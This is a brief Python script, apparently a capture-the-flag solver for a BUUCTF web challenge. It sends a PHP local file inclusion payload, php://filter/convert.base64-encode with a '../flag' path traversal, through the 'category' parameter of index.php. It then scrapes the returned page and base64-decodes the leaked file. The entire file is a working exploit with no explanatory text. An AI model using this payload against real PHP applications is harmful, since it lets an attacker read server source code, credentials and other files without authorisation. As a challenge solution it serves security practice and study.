import base64

import requests
import json

from bs4 import BeautifulSoup

def shellcode(url):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Host': '6a2999b9-c93f-4169-9212-6789e42cac9a.node5.buuoj.cn:81',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }

    cookies = {}

    data = None

    url = url + '/index.php?category=php://filter/convert.base64-encode/resource=index/../flag'

    response = requests.get(url, headers=headers, cookies=cookies)

    soup = BeautifulSoup(response.text, 'html.parser')
    flag = soup.find('div', class_ = 'page-include').getText(strip=True)
    return base64.b64decode(flag).decode('utf-8')



